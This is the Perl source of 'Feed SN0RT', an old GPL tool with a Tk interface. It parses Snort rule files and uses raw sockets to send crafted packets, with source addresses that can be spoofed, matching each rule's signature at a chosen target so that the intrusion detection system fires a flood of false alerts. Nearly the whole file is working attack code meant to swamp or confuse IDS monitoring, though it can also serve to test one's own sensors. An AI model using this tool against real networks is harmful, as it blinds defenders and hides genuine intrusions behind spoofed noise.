#!/usr/bin/perl
#
# Feed SN0RT
# Version 0.4
#
# Flooding a SN0RT IDS with packets created from
# SN0RT rule files
#
# Programmed by Bastian Ballmann [ Crazydj@chaostal.de ]
# http://www.crazydj.de
#
# Last Update: 24.07.2004
# 
# This program is free software; you can redistribute 
# it and/or modify it under the terms of the 
# GNU General Public License version 2 as published 
# by the Free Software Foundation.
#
# This program is distributed in the hope that it will 
# be useful, but WITHOUT ANY WARRANTY; without even 
# the implied warranty of MERCHANTABILITY or FITNESS 
# FOR A PARTICULAR PURPOSE. 
# See the GNU General Public License for more details. 


# You are r00t arent you?
die "You must be root to use this tool!\n\n" if($< != 0);


###[ Loading modules ]###

use Getopt::Std;              # Parsing parameters
use path::config;             # Reading configuration
use Net::RawIP;               # Creating packets
use Net::Pcap;                # Sniffin around
use path::hijack;             # Hijacking stuff
use strict;                   # Be strict!

# Do you have X and Tk?
BEGIN
{
    eval{ require Tk; };              
    import Tk unless $@;

    eval{ require Tk::ProgressBar; }; 
    import Tk::ProgressBar unless $@;
};


###[ Config ]###

# HTTP_PORTS
my $http_ports = 80;

# ORACLE_PORTS
my $oracle_ports = 1521;

# SHELLCODE_PORTS
my $shellcode_ports = 22;


###[ Global variables ]###

# Parameter hash
my %args;

# Config object
my $cfg = path::config->new();

my (@ruleset, @packets);

# Tk objects
my ($top, $result, $rules_entry, $source_entry, $dest_entry, $port_entry, $delay_entry, $device_entry, $feed);


###[ MAIN PART ]###

# Need help?
usage() if($ARGV[0] eq "--help");

# Start GUI version?
if($ARGV[0] eq "--gui")
{
    draw_gui();
}

# Read a config file
elsif($ARGV[0] eq "--conf")
{
    print "[ Reading config file $ARGV[1] ]\n";
    my $config = $cfg->readcfg($ARGV[1]);
    $config->{'parameter'}->{'ports'} = $config->{'parameter'}->{'feedsnort'}->{'ports'};
    $cfg->register_config($config);

    if($config->{'parameter'}->{'feedsnort'}->{'rules'} ne "")
    {
	$args{'r'} = $config->{'parameter'}->{'feedsnort'}->{'rules'};
    }

    if($config->{'parameter'}->{'feedsnort'}->{'ports'}->{'http'} ne "")
    {
	$http_ports = $config->{'parameter'}->{'feedsnort'}->{'ports'}->{'http'};
    }

    if($config->{'parameter'}->{'feedsnort'}->{'ports'}->{'oracle'} ne "")
    {
	$oracle_ports = $config->{'parameter'}->{'feedsnort'}->{'ports'}->{'oracle'};
    }

    if($config->{'parameter'}->{'feedsnort'}->{'ports'}->{'shellcode'} ne "")
    {
	$shellcode_ports = $config->{'parameter'}->{'feedsnort'}->{'ports'}->{'shellcode'};
    }

    start();
}
else
{
    # Parsing parameter
    getopts('vr:s:h:p:w:c:', \%args);

    # Check parameter
    exit(1) if($cfg->check(%args) == 1);
    start();
}


###[ Subroutines ]###

# Start the process
sub start
{
    # No rule files specified?
    if($args{'r'} eq "")
    {
	usage();
	die "\nError: I need some snort rule files...\n\n";
    }

    # No target?
    if($args{'h'} eq "")
    {
	usage();
	die "Error: What about a target???\n\n";
    }

    # No  source ip?
    # Well attack yaself...
    $args{'s'} = $args{'h'} if $args{'s'} eq "";

    # No default port?
    $args{'p'} = 80 if $args{'p'} eq "";

    # Register config
    $cfg->set_source($args{'s'});
    $cfg->set_target($args{'h'});
    $cfg->set_port($args{'p'});

    # Parse the rule files, create the packets and
    # throw them on the wire
    about() unless($ARGV[0] eq "--gui");
    feed_snort();
}


# Main subroutine
# Conrol subroutine to parse the rule files,
# create and send the attack packets
sub feed_snort
{
    # Parse a single rule file?
    if(-f $args{'r'})
    {
	parse_rules($args{'r'});
    }

    # Parse a directory of rule files
    elsif(-d $args{'r'})
    {
	opendir(R,$args{'r'}) || die "Error: Cannot read $args{'r'}\n$!\n\n";
	my @files = grep {/\.rules$/} readdir(R);
	closedir(R);
	map { parse_rules("$args{'r'}/$_") } @files;
    }
    else
    {
	die "Error: Cannot find file or directory $args{'r'}\n\n";
    }

    create_packets();
    send_packets();
}


# Subroutine to parse SN0RT rule files
sub parse_rules
{
    my $input = shift;
    my $count = 0;

    if($ARGV[0] eq "--gui")
    {
	$result->insert('end',"[Parsing rule file $input]\n");
	$result->see('end');
	$top->update();
    }
    else
    {
	print "[Parsing rule file $input]\n";
    }

    # Read the rule file
    open(RULESET,"<$input") || die "Error: Cannot read file $input!\n$!\n\n";

    while(<RULESET>)
    {
	my $rule_cfg = ();
	$count++;

	# Dont parse comments or empty lines
	next if( ($_ =~ /^\s*\#/) || (length($_) < 5) );

	# start parsing
	my @content = split(/\s/,$_);

	$rule_cfg->{'parameter'}->{'protocol'} = $content[1];
	
	if( ($content[3] eq "any") || ($content[3] eq "") )
	{
	    $rule_cfg->{'packet'}->{$rule_cfg->{'parameter'}->{'protocol'}}->{'srcport'} = ($cfg->get_port)[0];
	}
	elsif($content[3] =~ /HTTP/)
	{
	    $rule_cfg->{'packet'}->{$rule_cfg->{'parameter'}->{'protocol'}}->{'srcport'} = $http_ports;
	}
	elsif($content[3] =~ /ORACLE/)
	{
	    $rule_cfg->{'packet'}->{$rule_cfg->{'parameter'}->{'protocol'}}->{'srcport'} = $oracle_ports;
	}
	elsif($content[3] =~ /SHELLCODE/)
	{
	    $rule_cfg->{'packet'}->{$rule_cfg->{'parameter'}->{'protocol'}}->{'srcport'} = $shellcode_ports;
	}
	else
	{
	    $rule_cfg->{'packet'}->{$rule_cfg->{'parameter'}->{'protocol'}}->{'srcport'} = $content[3];
	}

	if( ($content[6] eq "any") || ($content[6] eq "") )
	{
	    $rule_cfg->{'packet'}->{$rule_cfg->{'parameter'}->{'protocol'}}->{'dstport'} = ($cfg->get_port)[0];
	}
	elsif($content[6] =~ /HTTP/)
	{
	    $rule_cfg->{'packet'}->{$rule_cfg->{'parameter'}->{'protocol'}}->{'dstport'} = $http_ports;
	}
	elsif($content[6] =~ /ORACLE/)
	{
	    $rule_cfg->{'packet'}->{$rule_cfg->{'parameter'}->{'protocol'}}->{'dstport'} = $oracle_ports;
	}
	elsif($content[6] =~ /SHELLCODE/)
	{
	    $rule_cfg->{'packet'}->{$rule_cfg->{'parameter'}->{'protocol'}}->{'dstport'} = $shellcode_ports;
	}
	else
	{
	    $rule_cfg->{'packet'}->{$rule_cfg->{'parameter'}->{'protocol'}}->{'dstport'} = $content[6];
	}

	if($rule_cfg->{'packet'}->{$rule_cfg->{'parameter'}->{'protocol'}}->{'srcport'} =~ /\:$/)
	{
	    chop $rule_cfg->{'packet'}->{$rule_cfg->{'parameter'}->{'protocol'}}->{'srcport'};

	}

	if($rule_cfg->{'packet'}->{$rule_cfg->{'parameter'}->{'protocol'}}->{'dstport'} =~ /\:$/)
	{
	    chop $rule_cfg->{'packet'}->{$rule_cfg->{'parameter'}->{'protocol'}}->{'dstport'};

	}

	# Set default values
	if($rule_cfg->{'parameter'}->{'protocol'} eq "tcp")
	{
	    $rule_cfg->{'packet'}->{'tcp'}->{'flags'}->{'syn'} = 0;
	    $rule_cfg->{'packet'}->{'tcp'}->{'flags'}->{'ack'} = 1;
	    $rule_cfg->{'packet'}->{'tcp'}->{'flags'}->{'rst'} = 0;
	    $rule_cfg->{'packet'}->{'tcp'}->{'flags'}->{'fin'} = 0;
	    $rule_cfg->{'packet'}->{'tcp'}->{'flags'}->{'psh'} = 0;
	    $rule_cfg->{'packet'}->{'tcp'}->{'flags'}->{'urg'} = 0;
	}

	$_ =~ /(.+)\((.+)\)/;
	my @packet = split(/\;\s/,$2);

	for(@packet)
	{
	    my ($key,$value) = split(/\:/);

	    if($key eq "flags")
	    {
		$rule_cfg->{'packet'}->{'tcp'}->{'flags'}->{'syn'} = 1 if $value =~ /S/i;
		$rule_cfg->{'packet'}->{'tcp'}->{'flags'}->{'ack'} = 1 if $value =~ /A/i;
		$rule_cfg->{'packet'}->{'tcp'}->{'flags'}->{'rst'} = 1 if $value =~ /R/i;		
		$rule_cfg->{'packet'}->{'tcp'}->{'flags'}->{'fin'} = 1 if $value =~ /F/i;		
		$rule_cfg->{'packet'}->{'tcp'}->{'flags'}->{'psh'} = 1 if $value =~ /P/i;		
		$rule_cfg->{'packet'}->{'tcp'}->{'flags'}->{'psh'} = 1 if $value =~ /\+/i;		
		$rule_cfg->{'packet'}->{'tcp'}->{'flags'}->{'urg'} = 1 if $value =~ /U/i;		
	    }
	    else
	    {
		$rule_cfg->{'parameter'}->{'feedsnort'}->{$key} = $value;
	    }
	}

	if($_ =~ /content/)
	{
	    $_ =~ /[uri]?content\:\s*\"(.*?)\"\;/;
	    $rule_cfg->{'packet'}->{'data'} = $1;
	}
	else
	{
	    $rule_cfg->{'packet'}->{'data'} = "";
	} 

	$_ =~ /msg\:(.*?)\;/;
	$rule_cfg->{'parameter'}->{'feedsnort'}->{'msg'} = $1;
	push @ruleset, $rule_cfg;
    }

    close(RULESET);

    if($ARGV[0] eq "--gui")
    {
	$result->insert('end',"[Found $count rules in file $input]\n");
	$result->see('end');
	$top->update();
    }
    else
    {
	print "[Found $count rules in file $input]\n";
    }
}


# Create the attack packets
sub create_packets
{
    if($ARGV[0] eq "--gui")
    {
	$result->insert('end',"[Creating packets...]\n");
	$result->see('end');
	$top->update();
    }
    else
    {
	print "[Creating packets...]\n";
    }

    while(scalar(@ruleset)>0)
    {
	my $rule = shift(@ruleset);

	foreach my $src ($cfg->get_source)
	{
	    foreach my $dst ($cfg->get_target)
	    {
		$rule->{'packet'}->{'ip'}->{'srcip'} = $src;
		$rule->{'packet'}->{'ip'}->{'dstip'} = $dst;
		$rule->{'parameter'}->{'feedsnort'}->{'packet'} = path::hijack::create_packet($rule);
		push @packets, $rule;
	    }
	}
    }
}


# Throw the packets on the wire
sub send_packets
{
    if($ARGV[0] eq "--gui")
    {
	$feed->configure(state => 'disabled', text => 'Feeding');
	$result->insert('end',"[Sending packets]\n\n");
	$result->see('end');
	$top->update();
    }
    else
    {
	print "[Sending packets]\n\n";
    }

    my $percent_done = 0;
    my ($prog, $percent);
    my $count = 0;
    my $num_all_packets = scalar(@packets);

    # Progress bar
    if(defined $top)
    {	
	$prog = $top->Toplevel;
	$prog->title('Status');
	$prog->configure(-background => 'black');
	my $title_frame = $prog->Frame()->grid();
	$title_frame->configure(-background => 'black');
	
	$title_frame->Label(-text => 'Sending packets',
			    -background => 'black',
			    -foreground => 'green',
			    -border => 0)->grid(-row => 1, -pady => 5);

	my $status_frame = $prog->Frame()->grid();
	$status_frame->configure(-background => 'black');
	
	$percent = $status_frame->Label(-text => $percent_done."%",
					-background => 'black',
					-foreground => 'green',
					-border => 0)->grid(-row => 1, -column => 1, -pady => 20);

	$status_frame->ProgressBar(-from => 0,
				   -to => 100,
				   -colors => [0,'green'],
				   -variable => \$percent_done)->grid(-row => 1, -column => 2, -pady => 20);
    }

    while(scalar(@packets) > 0)
    {
	my $rule = shift(@packets);

	if($ARGV[0] eq "--gui")
	{
	    $result->insert('end',"Simulating " . $rule->{'parameter'}->{'feedsnort'}->{'msg'} . " attack\n");
	    $result->see('end');
	    $top->update();
	}
	else
	{
	    print ">>> Simulating $rule->{'parameter'}->{'feedsnort'}->{'msg'} attack to " . $rule->{'packet'}->{'ip'}->{'dstip'} . "\n";
	}

	my $packet = $rule->{'parameter'}->{'feedsnort'}->{'packet'};       
	$packet->send(0.1,1) if(ref($packet));

	$count++;
	$percent_done = int(($count / $num_all_packets) * 100);
	
	if(defined $top)
	{
	    $percent->configure(-text => $percent_done."%");
	    $top->update;
	    $prog->update if defined $prog;
	}

	# Be verbose
	if($top)
	{
	    $result->insert('end',"    $args{'s'}:$rule->{'packet'}->{$rule->{'parameter'}->{'protocol'}}->{'srcport'} --> $args{'h'}:$rule->{'packet'}->{$rule->{'parameter'}->{'protocol'}}->{'dstport'}\n") if $args{'v'};
	    $result->insert('end',"    Flags: SYN $rule->{'packet'}->{$rule->{'parameter'}->{'protocol'}}->{'flags'}->{'syn'} ACK $rule->{'packet'}->{$rule->{'parameter'}->{'protocol'}}->{'flags'}->{'ack'} RST $rule->{'packet'}->{$rule->{'parameter'}->{'protocol'}}->{'flags'}->{'rst'} FIN $rule->{'packet'}->{$rule->{'parameter'}->{'protocol'}}->{'flags'}->{'fin'} PSH $rule->{'packet'}->{$rule->{'parameter'}->{'protocol'}}->{'flags'}->{'psh'} URG $rule->{'packet'}->{$rule->{'parameter'}->{'protocol'}}->{'flags'}->{'urg'}\n") if $args{'v'};
	    $result->insert('end',"    Payload: $rule->{'packet'}->{'data'}\n\n") if $args{'v'};
	    $result->see('end');
	    $top->update;
	}
	else
	{
	    print "    $args{'s'}:$rule->{'packet'}->{$rule->{'parameter'}->{'protocol'}}->{'srcport'} --> $args{'h'}:$rule->{'packet'}->{$rule->{'parameter'}->{'protocol'}}->{'dstport'}\n" if $args{'v'};
	    print "    Flags: SYN $rule->{'packet'}->{$rule->{'parameter'}->{'protocol'}}->{'flags'}->{'syn'} ACK $rule->{'packet'}->{$rule->{'parameter'}->{'protocol'}}->{'flags'}->{'ack'} RST $rule->{'packet'}->{$rule->{'parameter'}->{'protocol'}}->{'flags'}->{'rst'} FIN $rule->{'packet'}->{$rule->{'parameter'}->{'protocol'}}->{'flags'}->{'fin'} PSH $rule->{'packet'}->{$rule->{'parameter'}->{'protocol'}}->{'flags'}->{'psh'} URG $rule->{'packet'}->{$rule->{'parameter'}->{'protocol'}}->{'flags'}->{'urg'}\n" if $args{'v'};
	    print "    Payload: $rule->{'packet'}->{'data'}\n\n" if $args{'v'};
	}

	# Timer?
	sleep($args{'w'}) if $args{'w'} ne "";
    }

    if($top)
    {
	$prog->destroy();
	$feed->configure(-state => 'normal', -text => 'Start feeding');
	$result->insert('end',"[Finished feeding]");
	$result->see('end');
    }
    else
    {
	print "\n[Finished feeding]\n\n";
    }
}
	

# Print usage
sub usage
{
    about();
    print "Usage: $0 -r <snort-rulefiles> -s <source-ip> -h <host>\n\n";
    print "-p <n> Default port if keyword any was found in the rule\n";
    print "-w <n> To wait n seconds after sending an attack packet\n";
    print "--conf <file> to load a config file\n";
    print "-h or --help to get this text\n";
    print "--gui to load the gui version\n\n";
    exit(0);
}


# Print about
sub about
{
    print "\nFeed SN0RT - Programmed by Bastian Ballmann\n";
    print "[ http://www.crazydj.de ]\n";
    print "Version 0.4\n\n";
}
    

###[ The GUI code ]###

sub draw_gui
{
    # Main window
    $top = MainWindow->new(-background => 'black', 
			   -foreground => 'green', 
			   -borderwidth => 2);
    $top->title('[ Feed Snort ]');
    $top->option(add => '*background', 'black');
    $top->option(add => '*foreground', 'green');

    # Frames
    my $content = $top->Frame->pack(-side => 'top', -pady => 10, -padx => 10);
    my $configure = $top->Frame->pack(-side => 'top', -pady => 5, -padx => 10);
    my $left = $configure->Frame->pack(-side => 'left', -padx => 10);
    my $right = $configure->Frame->pack(-side => 'right', -padx => 10);
    my $toolbar = $top->Frame->pack(-side => 'bottom', -pady => 5, -padx => 10);
    my $result_frame = $top->Frame->pack(-side => 'bottom', -pady => 15, -padx => 10);
    my $down = $top->Frame->pack(-side => 'bottom', -padx => 10, -pady => 0);
    my $d_left = $down->Frame->pack(-side => 'left', -padx => 10);
    my $d_right = $down->Frame->pack(-side => 'right', -padx => 10);
    my $p = $d_right->Frame->pack(-side => 'top', -padx => 10);
    my $r = $d_right->Frame->pack(-side => 'top', -padx => 10);
    my $s = $d_right->Frame->pack(-side => 'top', -padx => 10);

    # Labels
    $content->Label(-text => '[ Feed SN0RT - Version 0.4 ]',
		    -border => 0)->pack(-pady => 5);

    $content->Label(-text => '[ Programmed by Bastian Ballmann ]',
		    -border => 0)->pack(-pady => 5);


    # Configuration
    $left->Label(-text => 'Snort Rulefiles:',
		 -border => 0)->pack(-pady => 10, -padx => 5);
    
    $rules_entry = $right->Entry(-background => '#3C3C3C')->pack(-pady => 6);
    $rules_entry->insert('end',"/etc/snort/rules");
    
    $left->Label(-text => 'Source IP:',
		 -border => 0)->pack(-pady => 10, -padx => 5);
    
    $source_entry = $right->Entry(-background => '#3C3C3C')->pack(-pady => 6);
    
    
    $left->Label(-text => 'Destination IP:',
		 -border => 0)->pack(-pady => 10, -padx => 5);
    
    $dest_entry = $right->Entry(-background => '#3C3C3C')->pack(-pady => 6);
    
    $left->Label(-text => 'Default Port:',
		 -border => 0)->pack(-pady => 10, -padx => 5);
    
    $port_entry = $right->Entry(-background => '#3C3C3C')->pack(-pady => 6);
    $port_entry->insert('end',"80");
    
    $left->Label(-text => 'Delay:',
		 -border => 0)->pack(-pady => 10, -padx => 5);
    
    $delay_entry = $right->Entry(-background => '#3C3C3C')->pack(-pady => 6);
    $delay_entry->insert('end',"1");

    $left->Label(-text => 'Device:',
		 -border => 0)->pack(-pady => 10, -padx => 5);

    $device_entry = $right->Entry(-background => '#3C3C3C')->pack(-pady => 6);
    
    my $errbuf;
    $device_entry->insert('end',Net::Pcap::lookupdev(\$errbuf));


    # Toolbar
    $feed = $toolbar->Button(-text => 'Start feeding',
			     -activebackground => 'black',
			     -activeforeground => 'red',
			     -borderwidth => 0,
			     -border => 0,
			     -command => \&getcfg)->pack(-side => 'left', -padx => 10);

    $toolbar->Button(-text => 'Quit',
		     -activebackground => 'black',
		     -activeforeground => 'red',
		     -borderwidth => 0,
		     -border => 0,
		     -command => sub { exit(0); })->pack(-side => 'right', -padx => 10);

    # Output
    $result_frame->Label(-text => 'Output',
			 -border => 0)->pack(-side => 'top', -pady => 10);

    $result = $result_frame->Scrolled('Text',
				      -border => 2,
				      -width => 57,
				      -height => 10)->pack(-side => 'bottom', -pady => 5);
    $result->configure(-scrollbars => 'e');

    MainLoop();
}


# Readin the config
sub getcfg
{
    my $tmp;

    $tmp = $rules_entry->get;
    if($tmp eq "")
    {
	show_error("I need at least one Snort rule file!");
	return;
    }
    else
    {
	$args{'r'} = $tmp;
    }

    $tmp = $source_entry->get;

    if(path::config::check_ip($tmp) == 1)
    {
	show_error("Bad source ip $tmp!\n");
	return;
    }
    else
    {
	$args{'s'} = $tmp;
    }

    $tmp = $dest_entry->get;
    if($tmp eq "")
    {
	show_error("Dont know whom to send the packets...\n");
	return;
    }
    else
    {
	if(path::config::check_ip($tmp) == 1)
	{
	    show_error("Bad destination ip $tmp!");
	    return;
	}
	else
	{
	    $args{'h'} = $tmp;
	}
    }

    $args{'p'} = $port_entry->get;
    $args{'w'} = $delay_entry->get;
    $args{'i'} = $device_entry->get;
    start();
}


# Show Error Message
sub show_error
{
    my $msg =  shift;
    my $error = $top->Toplevel;
    $error->title('Error');
    $error->option(add => '*background', 'black');
    $error->option(add => '*foreground', 'green');

    $error->Label(-text => $msg,
		  -border => '0')->pack(-padx => 10, -pady => 10, -side => 'top');

    $error->Button(-text => 'OK',
		   -activebackground => 'black',
		   -activeforeground => 'red',
		   -border => 0,
		   -command => sub { $error->destroy })->pack(-pady => 5, -side => 'bottom');
}

